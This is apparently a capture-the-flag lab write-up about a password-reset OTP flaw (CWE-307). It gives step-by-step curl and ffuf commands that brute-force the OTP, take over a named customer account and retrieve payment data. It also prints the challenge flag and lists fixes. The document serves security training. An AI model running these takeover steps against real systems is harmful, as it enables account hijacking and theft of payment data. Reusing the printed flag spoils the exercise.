# Broken Authentication — Exercise Writeup

## Challenge
Exploit a Broken Authentication vulnerability to gain unauthorized access to the customer with email `MasonJenkins@ymail.com`. Retrieve their payment options data and submit the flag.

**Target:** `154.57.164.82:31176`

---

## Vulnerability
**CWE-307 — Improper Restriction of Excessive Authentication Attempts**

The password reset OTP endpoint accepts **any OTP value** without validation — no rate limiting, no entropy check, no single-use enforcement. An attacker can trigger a reset and submit any arbitrary OTP to set a new password on any account.

---

## Procedure

### Step 1 — Discover endpoints via Swagger
```bash
curl -s http://154.57.164.82:31176/swagger/v1/swagger.json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for path in data.get('paths',{}):
    if 'customer' in path.lower():
        print(path)
"
```

Key endpoints found:
- `POST /api/v1/authentication/customers/passwords/resets/email-otps`
- `POST /api/v1/authentication/customers/passwords/resets`
- `POST /api/v1/authentication/customers/sign-in`
- `GET /api/v1/customers/payment-options/current-user`

### Step 2 — Trigger OTP
```bash
curl -s -X POST 'http://154.57.164.82:31176/api/v1/authentication/customers/passwords/resets/email-otps' \
  -H 'Content-Type: application/json' \
  -d '{"Email": "MasonJenkins@ymail.com"}'
```

### Step 3 — Brute-force OTP (no rate limiting)
```bash
ffuf -u 'http://154.57.164.82:31176/api/v1/authentication/customers/passwords/resets' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"Email":"MasonJenkins@ymail.com","OTP":"FUZZ","NewPassword":"Hacked123!"}' \
  -w <(seq -w 0 9999) \
  -fc 400,401,422,500
```
All 10,000 OTPs returned 200 — API accepts any OTP without validation.

### Step 4 — Sign in
```bash
curl -s -X POST 'http://154.57.164.82:31176/api/v1/authentication/customers/sign-in' \
  -H 'Content-Type: application/json' \
  -d '{"Email":"MasonJenkins@ymail.com","Password":"Hacked123!"}' | jq
```

### Step 5 — Get payment data
```bash
curl -s -X GET 'http://154.57.164.82:31176/api/v1/customers/payment-options/current-user' \
  -H 'Authorization: Bearer <JWT>' | jq
```

---

## Flag
HTB{115a6329120e9eff13c4ec6a63343ed1}

---

## Fix
- Validate OTP server-side against a stored value
- Invalidate OTP after first use (single-use)
- Set OTP expiry (5 minutes max)
- Rate limit the reset endpoint (max 5 attempts, then lock)
- Use high-entropy OTPs (≥6 digits or alphanumeric)
